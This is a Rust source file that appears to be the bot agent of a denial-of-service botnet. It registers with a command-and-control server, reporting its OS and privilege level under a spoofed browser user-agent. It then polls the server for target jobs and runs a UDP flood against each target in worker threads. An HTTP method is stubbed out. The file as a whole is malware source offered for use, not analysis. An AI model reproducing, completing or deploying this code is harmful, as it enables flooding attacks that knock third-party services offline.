use std::thread;
use socket2::{Domain, SockAddr, Socket, Type};
use reqwest::blocking::Client;
use serde::{Serialize, Deserialize};

// const USER_AGENT: &str = env!("USER_AGENT");
const USER_AGENT: &str = "Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.2.15 Version/10.00";

// https://localhost:8000
//  - reg    (post)
//  - target (get)

#[derive(Serialize)]
pub struct AgentInfo {
    os: String,
    elevated: bool,
}

#[derive(Deserialize)]
enum AttackMethod { 
    HTTP,
    UDP
}

#[derive(Deserialize)]
struct Job {
    target: String,
    method: AttackMethod,
    agents: isize,
}

struct ThreadPool<T> {
    threads: Vec<thread::JoinHandle<T>>
}

impl<T: Send + 'static> ThreadPool<T> {
    /// Initialize a new thread pool
    fn new() -> Self {
        Self { threads: Vec::new() }
    }

    /// Add a thread and get index of Vec thread pool 
    fn add<F: FnOnce() -> T + Send + 'static> (&mut self, f: F) -> usize {
        let index = self.threads.len();
        self.threads.push(thread::spawn(f));

        index
    }

    /// Remove a thread by index
    fn remove(&mut self, index: usize) -> thread::JoinHandle<T> {
        self.threads.remove(index)
    }

    /// Join all threads
    fn join_all(self) -> Result<Vec<T>, ()> {
        let mut vector_generics = Vec::new();
        for t in self.threads.into_iter() {
            let join_result = t.join().unwrap();
            vector_generics.push(join_result);
        }

        Ok(vector_generics)
    }

}

fn main() {
    let client = Client::new();
    let mut threadpool = ThreadPool::new();
    let agent_info = AgentInfo { os: "Windows".to_string(), elevated: false };

    loop {
        let mut _r = client.post("http://127.0.0.1:8000/reg")
            .header("user-agent", USER_AGENT)
            .header("Content-Type", "application/json")
            .body(serde_json::to_string(&agent_info).unwrap())
            .send()
            .unwrap();

        dbg!(USER_AGENT);
        dbg!(&_r.status());

        let uuid = _r.text().unwrap();
        dbg!(uuid.clone());
        
        loop {
            std::thread::sleep(std::time::Duration::from_secs(5));
            let targets = match client.get("http://127.0.0.1:8000/target").query(&[("uuid", &uuid)]).send() {
                Ok(r) => {
                    let rjson = if let Ok(rjson) = r.json::<Vec<Job>>() {
                        rjson
                    } else {
                        break;
                    };

                    rjson
                },
                Err(_) => break
            };

            // TEST: simple UDP flood implemented
            for target in targets {
                let target_sockaddr = SockAddr::from(target.target.parse::<std::net::SocketAddr>().unwrap());
                match target.method {
                    AttackMethod::HTTP => (),
                    AttackMethod::UDP => {
                        threadpool.add(move ||{
                            let socket = Socket::new(Domain::IPV4, Type::DGRAM, None).unwrap();
                            socket.connect(&target_sockaddr).unwrap();
                            for _ in 0..100 {
                                socket.send_to("123".as_bytes(), &target_sockaddr).unwrap();
                            }
                        });
                    }
                }
            }
        }
    }
}

